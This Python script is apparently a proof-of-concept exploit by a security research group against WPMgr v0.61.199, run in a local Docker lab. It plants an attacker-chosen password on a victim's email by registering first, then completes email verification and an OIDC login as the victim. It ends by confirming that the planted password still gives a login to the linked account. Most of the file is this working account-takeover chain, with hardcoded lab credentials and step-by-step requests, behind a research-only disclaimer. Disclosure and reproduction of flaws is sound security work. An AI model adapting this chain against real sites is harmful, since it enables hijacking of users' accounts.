#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: wpmgr-social-planted-password (High: 8.1)
#  Vendor: WPMgr (mosamlife)
#  Versions: WPMgr v0.61.199
#  Impact: planted password survives email verify and OIDC link; attacker logs in as victim
#  Requires: Docker, git, python3; loopback compose clones mosamlife/wpmgr at e1b3a163
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "wpmgr-social-planted-password"
_EMAIL = "abraxas.null@proton.me"

_RST = "\033[0m"
_BLD = "\033[1m"
_CYAN = (0, 255, 249)
_MAGENTA = (255, 0, 212)
_PINK = (255, 77, 224)
_GREEN = (57, 255, 20)
_GOLD = (255, 230, 0)
_AMBER = (255, 201, 70)
_RED = (255, 64, 96)
_MUTED = (140, 155, 175)
_INK = (232, 255, 248)
_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    if not _on():
        return ""
    return f"\033[38;2;{r};{g};{b}m"


def _paint(text, rgb, bold=False):
    if not text or rgb is None:
        return text or ""
    prefix = _rgb(*rgb) + (_BLD if bold else "")
    return "".join(ch if ch == " " else prefix + ch for ch in text)


def _box(inner, border):
    edge = _rgb(*border) + "║" + _RST
    return edge + " " + inner + _RST + " " + edge


def _rule(left, right, border, width):
    return _rgb(*border) + left + "═" * (width - 2) + right + _RST


def _split(text, left_end, right_start, left_rgb, right_rgb, mid_rgb=None, left_bold=False):
    return (
        _paint(text[:left_end], left_rgb, bold=left_bold)
        + _paint(text[left_end:right_start], mid_rgb)
        + _paint(text[right_start:], right_rgb)
    )


def _fit(left, right, width, fill=" "):
    gap = max(width - len(left) - len(right), 1)
    return (left + fill * gap + right)[:width].ljust(width)


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line):
    width = max(len(line), 1)
    out = []
    quoted = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        quoted ^= ch == '"'
        if ch == '"':
            color = _AMBER if quoted else _GOLD
        elif quoted:
            color = _GOLD
        else:
            color = _rain(x, width)
        out.append(_rgb(*color) + ch)
    return "".join(out) + _RST


def _banner_width(cols):
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(row) for row in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    return content_w, box_w


def _title_row(width):
    left, right = " ABRAXAS LABS", "analyze · reverse · disclose"
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _CYAN, _MUTED, left_bold=True)


def _cve_row(width):
    left, right = " " + _CVE, "authorized research only"
    rest = max(width - len(left) - len(right), 3)
    text = (left + " local lab ".center(rest)[:rest] + right)[:width].ljust(width)
    return _split(text, len(left), width - len(right), _PINK, _GREEN, mid_rgb=_MAGENTA, left_bold=True)


def _mail_row(width):
    left, right = " Mail", _EMAIL
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _GOLD, _CYAN)


def _status_line():
    marks = {"[": _GREEN, "]": _GREEN, "*": _GREEN, "·": _PINK, "#": _PINK}
    text = "[*]  abraxas!null ready on #labs"
    return "".join(ch if ch == " " else _rgb(*marks.get(ch, _INK)) + ch for ch in text) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    content_w, box_w = _banner_width(cols)
    lines = [
        _rule("╔", "╗", _CYAN, box_w),
        _box(_title_row(content_w) + _RST, _CYAN),
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_cve_row(content_w) + _RST, _MAGENTA),
        _rule("╠", "╣", _MAGENTA, box_w),
    ]
    for glyph in _ART["abraxas"] + _ART["labs"]:
        vis = glyph[:content_w].ljust(content_w)
        lines.append(_box(_logo_line(vis), _MAGENTA))
    lines.extend([
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_mail_row(content_w) + _RST, _MAGENTA),
        _rule("╚", "╝", _CYAN, box_w),
        " " + _status_line(),
    ])
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _message_color(s):
    low = s.lower()
    stripped = s.lstrip()
    if low.startswith("success"):
        return _rgb(*_GREEN) + _BLD
    if low.startswith("fail"):
        return _rgb(*_RED) + _BLD
    if "user_id" in low:
        return _rgb(*_AMBER) + _BLD
    if low.startswith("status=") or "status=" in low[:20]:
        return _rgb(*_CYAN)
    if low.startswith("carrier"):
        return _rgb(*_MAGENTA)
    if stripped[:1] in "{[":
        return _rgb(*_GOLD)
    return _rgb(*_INK)


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    dest = kwargs.get("file", _sys.stdout)
    if dest is not _sys.stdout and dest is not _sys.stderr:
        _builtins.print(*args, **kwargs)
        return
    extra = {k: v for k, v in kwargs.items() if k != "sep"}
    _builtins.print(_message_color(s) + s + _RST, **extra)

print_abraxas_banner()
_builtins.print = _cprint

"""WPMgr H04: OIDC link onto a planted password account leaves the hash intact."""

import html
import json
import os
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from http.cookiejar import CookieJar
from pathlib import Path
from typing import Any

LABEL = "WPMGR-H04-SOCIAL-PLANT"
WITNESS = "WPMGR-H04-PLANTED-PASSWORD-SURVIVES"
HOST = "127.0.0.1"
WEB_PORT = int(os.environ.get("WEB_PORT", "18180"))
API_PORT = int(os.environ.get("API_PORT", "18181"))
MAILPIT_PORT = int(os.environ.get("MAILPIT_PORT", "18185"))
DEX_PORT = int(os.environ.get("DEX_PORT", "18184"))
PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "wpmgrh04")
WEB = f"http://{HOST}:{WEB_PORT}"
API = f"http://{HOST}:{API_PORT}"
MAILPIT = f"http://{HOST}:{MAILPIT_PORT}"
CLAIM = "wpmgr-h04-bootstrap-claim-secret"
OWNER_EMAIL = "owner.h04@lab.test"
OWNER_PASSWORD = "owner-pass-h04x"
VICTIM_EMAIL = "victim.h04@lab.test"
ATTACKER_PASSWORD = "attacker-pass-h04"
DEX_PASSWORD = "dex-victim-h04"
HERE = Path(__file__).resolve().parent


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(
        self,
        req: urllib.request.Request,
        fp: Any,
        code: int,
        msg: str,
        headers: Any,
        newurl: str,
    ) -> None:
        raise urllib.error.HTTPError(req.full_url, code, msg, headers, fp)


@dataclass(frozen=True)
class HttpResult:
    status: int
    body: str
    url: str
    location: str
    set_cookie: str


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def success(detail: str) -> int:
    log(f"IOC {detail}")
    log(f"SUCCESS {LABEL} planted-password-survives-oidc-link {WITNESS}")
    return 0


def _opener(jar: CookieJar | None, follow: bool) -> urllib.request.OpenerDirector:
    handlers: list[Any] = []
    if not follow:
        handlers.append(_NoRedirect())
    if jar is not None:
        handlers.append(urllib.request.HTTPCookieProcessor(jar))
    return urllib.request.build_opener(*handlers)


def http(
    method: str,
    url: str,
    *,
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
    jar: CookieJar | None = None,
    follow: bool = True,
    timeout: int = 45,
) -> HttpResult:
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("User-Agent", "wpmgr-h04-lab")
    for key, value in (headers or {}).items():
        req.add_header(key, value)
    opener = _opener(jar, follow)
    try:
        with opener.open(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", "replace")
            loc = resp.headers.get("Location", "") or ""
            cookie = resp.headers.get("Set-Cookie", "") or ""
            return HttpResult(resp.getcode() or 0, body, resp.geturl(), loc, cookie)
    except urllib.error.HTTPError as exc:
        raw = exc.read() if exc.fp is not None else b""
        body = raw.decode("utf-8", "replace")
        loc = exc.headers.get("Location", "") if exc.headers else ""
        cookie = exc.headers.get("Set-Cookie", "") if exc.headers else ""
        return HttpResult(exc.code, body, url, loc or "", cookie or "")


def json_post(
    url: str,
    payload: dict[str, Any],
    *,
    jar: CookieJar | None = None,
    extra_headers: dict[str, str] | None = None,
) -> HttpResult:
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    if extra_headers:
        headers.update(extra_headers)
    return http(
        "POST",
        url,
        data=json.dumps(payload).encode("utf-8"),
        headers=headers,
        jar=jar,
        follow=False,
    )


def has_session_cookie(jar: CookieJar) -> bool:
    return any(c.name == "wpmgr_session" and c.value for c in jar)


def compose_exec(*args: str, timeout: int = 30) -> subprocess.CompletedProcess[str]:
    cmd = ["docker", "compose", "-p", PROJECT, "exec", "-T", *args]
    return subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=timeout)


def db_query(sql: str) -> str:
    result = compose_exec(
        "postgres",
        "psql",
        "-U",
        "wpmgr",
        "-d",
        "wpmgr",
        "-tA",
        "-c",
        sql,
    )
    if result.returncode != 0:
        err = (result.stderr or result.stdout or "").strip()[:240]
        raise RuntimeError(f"psql rc={result.returncode} {err}")
    return (result.stdout or "").strip()


def wait_mailpit_token(email: str, deadline: float) -> str | None:
    pattern = re.compile(r"verify-email\?token=([A-Za-z0-9_\-]+)")
    while time.time() < deadline:
        listing = http("GET", f"{MAILPIT}/api/v1/messages", follow=True, timeout=10)
        if listing.status != 200:
            time.sleep(2)
            continue
        try:
            payload = json.loads(listing.body)
        except json.JSONDecodeError:
            time.sleep(2)
            continue
        messages = payload.get("messages")
        if not isinstance(messages, list):
            messages = []
        for msg in messages:
            to_list = msg.get("To") or []
            addrs = [
                (item.get("Address") or "").lower()
                for item in to_list
                if isinstance(item, dict)
            ]
            if email.lower() not in addrs:
                continue
            msg_id = msg.get("ID") or msg.get("Id") or msg.get("id")
            if not msg_id:
                continue
            detail = http(
                "GET",
                f"{MAILPIT}/api/v1/message/{urllib.parse.quote(str(msg_id))}",
                follow=True,
                timeout=10,
            )
            blob = html.unescape(detail.body)
            match = pattern.search(blob)
            if match:
                return match.group(1)
        time.sleep(2)
    return None


def _form_fields(page: str) -> dict[str, str]:
    fields: dict[str, str] = {}
    for match in re.finditer(
        r"<input\b([^>]*)>",
        page,
        flags=re.IGNORECASE,
    ):
        tag = match.group(1)
        name_m = re.search(r'name=["\']([^"\']+)["\']', tag, flags=re.IGNORECASE)
        if not name_m:
            continue
        value_m = re.search(r'value=["\']([^"\']*)["\']', tag, flags=re.IGNORECASE)
        fields[html.unescape(name_m.group(1))] = html.unescape(value_m.group(1) if value_m else "")
    return fields


def _form_action(page: str, current_url: str) -> tuple[str, str]:
    match = re.search(
        r"<form\b([^>]*)>",
        page,
        flags=re.IGNORECASE,
    )
    if not match:
        return current_url, "POST"
    tag = match.group(1)
    action_m = re.search(r'action=["\']([^"\']*)["\']', tag, flags=re.IGNORECASE)
    method_m = re.search(r'method=["\']([^"\']+)["\']', tag, flags=re.IGNORECASE)
    action = html.unescape(action_m.group(1)) if action_m else ""
    method = (method_m.group(1) if method_m else "POST").upper()
    return urllib.parse.urljoin(current_url, action), method


def complete_dex_login(jar: CookieJar, start_url: str) -> HttpResult:
    current = start_url
    for _ in range(12):
        page = http("GET", current, jar=jar, follow=True, timeout=30)
        if "/auth/oidc/callback" in page.url:
            return page
        body_l = page.body.lower()
        if "login" in body_l and ("password" in body_l or 'name="login"' in body_l):
            action, method = _form_action(page.body, page.url)
            fields = _form_fields(page.body)
            fields["login"] = VICTIM_EMAIL
            fields["password"] = DEX_PASSWORD
            encoded = urllib.parse.urlencode(fields).encode("utf-8")
            posted = http(
                method or "POST",
                action,
                data=encoded,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                jar=jar,
                follow=True,
                timeout=30,
            )
            if "/auth/oidc/callback" in posted.url or posted.status in {302, 303}:
                if "/auth/oidc/callback" in posted.url:
                    return posted
                if posted.location:
                    current = urllib.parse.urljoin(posted.url, posted.location)
                    continue
            current = posted.url
            if "approval" in posted.body.lower() or "grant access" in posted.body.lower():
                action, method = _form_action(posted.body, posted.url)
                fields = _form_fields(posted.body)
                fields["approval"] = "approve"
                encoded = urllib.parse.urlencode(fields).encode("utf-8")
                approved = http(
                    method or "POST",
                    action,
                    data=encoded,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    jar=jar,
                    follow=True,
                    timeout=30,
                )
                return approved
            return posted
        if page.status >= 400:
            return page
        if page.location:
            current = urllib.parse.urljoin(page.url, page.location)
            continue
        return page
    return HttpResult(0, "", current, "", "")


def victim_row() -> str:
    return db_query(
        "SELECT coalesce(status,'') || '|' || "
        "CASE WHEN password_hash IS NULL OR password_hash = '' THEN 'nohash' ELSE 'hash' END "
        "|| '|' || CASE WHEN email_verified_at IS NULL THEN 'unverified' ELSE 'verified' END "
        f"FROM users WHERE email = '{VICTIM_EMAIL}';"
    )


def identity_row() -> str:
    return db_query(
        "SELECT coalesce(i.provider,'') || '|' || coalesce(i.email,'') "
        "FROM users u JOIN user_identities i ON i.user_id = u.id "
        f"WHERE u.email = '{VICTIM_EMAIL}' ORDER BY i.created_at LIMIT 1;"
    )


def main() -> int:
    log(f"IOC ports web={WEB_PORT} api={API_PORT} dex={DEX_PORT} mailpit={MAILPIT_PORT}")

    owner_jar = CookieJar()
    claimed = json_post(
        f"{WEB}/auth/register",
        {"email": OWNER_EMAIL, "password": OWNER_PASSWORD, "name": "Lab Owner"},
        jar=owner_jar,
        extra_headers={"X-Wpmgr-Bootstrap-Claim": CLAIM},
    )
    if claimed.status not in {200, 201} or not has_session_cookie(owner_jar):
        return fail(f"bootstrap-claim http={claimed.status} body={claimed.body[:180]}")
    log("IOC bootstrap-claimed")

    planted = json_post(
        f"{WEB}/auth/register",
        {"email": VICTIM_EMAIL, "password": ATTACKER_PASSWORD, "name": "Planted Victim"},
    )
    if planted.status != 200:
        return fail(f"plant-register http={planted.status} body={planted.body[:180]}")
    try:
        planted_json = json.loads(planted.body)
    except json.JSONDecodeError:
        planted_json = {}
    if planted_json.get("pending") is not True:
        return fail(f"plant-not-pending body={planted.body[:180]}")
    row = victim_row()
    if not row.startswith("pending|hash|unverified"):
        return fail(f"plant-db-state {row}")
    log(f"IOC planted-pending {row}")

    token = wait_mailpit_token(VICTIM_EMAIL, time.time() + 90)
    if not token:
        return fail("mailpit-token-missing")
    log("IOC mailpit-token")

    verified = json_post(f"{WEB}/auth/verify-email", {"token": token})
    if verified.status != 200:
        return fail(f"verify-email http={verified.status} body={verified.body[:180]}")
    row = victim_row()
    if "|hash|verified" not in row or row.startswith("pending"):
        return fail(f"verify-cleared-or-missing-hash {row}")
    log(f"IOC email-verified-hash-kept {row}")

    oidc_jar = CookieJar()
    start = http("GET", f"{WEB}/auth/oidc/login", jar=oidc_jar, follow=False, timeout=30)
    if start.status not in {302, 303}:
        return fail(f"oidc-start http={start.status} loc={start.location[:180]} body={start.body[:160]}")
    dex_url = urllib.parse.urljoin(start.url, start.location)
    if "dex.localhost" not in dex_url and "/dex/" not in dex_url:
        return fail(f"oidc-start-not-dex loc={dex_url[:180]}")
    log(f"IOC oidc-start {dex_url.split('?', 1)[0]}")
    linked = complete_dex_login(oidc_jar, dex_url)
    if not has_session_cookie(oidc_jar):
        return fail(f"oidc-no-session http={linked.status} url={linked.url[:180]} body={linked.body[:180]}")
    me = http("GET", f"{WEB}/auth/me", jar=oidc_jar, follow=True, timeout=20)
    if me.status != 200 or VICTIM_EMAIL not in me.body:
        return fail(f"oidc-me http={me.status} body={me.body[:180]}")
    idents = http("GET", f"{WEB}/auth/me/identities", jar=oidc_jar, follow=True, timeout=20)
    if idents.status != 200 or '"provider":"oidc"' not in idents.body.replace(" ", ""):
        ident_db = identity_row()
        return fail(
            f"oidc-identity-missing http={idents.status} body={idents.body[:180]} db={ident_db}"
        )
    ident_db = identity_row()
    if not ident_db.startswith("oidc|"):
        return fail(f"oidc-identity-db {ident_db}")
    log(f"IOC oidc-linked {ident_db}")

    pw_jar = CookieJar()
    login = json_post(
        f"{WEB}/auth/login",
        {"email": VICTIM_EMAIL, "password": ATTACKER_PASSWORD},
        jar=pw_jar,
    )
    if login.status != 200 or not has_session_cookie(pw_jar):
        return fail(f"password-login http={login.status} body={login.body[:180]}")
    me_pw = http("GET", f"{WEB}/auth/me", jar=pw_jar, follow=True, timeout=20)
    if me_pw.status != 200 or VICTIM_EMAIL not in me_pw.body:
        return fail(f"password-me http={me_pw.status} body={me_pw.body[:180]}")
    idents_pw = http("GET", f"{WEB}/auth/me/identities", jar=pw_jar, follow=True, timeout=20)
    if idents_pw.status != 200 or '"provider":"oidc"' not in idents_pw.body.replace(" ", ""):
        return fail(f"password-identity-missing body={idents_pw.body[:180]}")
    row = victim_row()
    log(f"IOC password-login-survived {row} {ident_db}")
    return success("planted-password-and-oidc-both-valid")


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except SystemExit:
        raise
    except Exception as exc:  # noqa: BLE001 — process edge
        raise SystemExit(fail(f"exception {type(exc).__name__}: {exc}"))

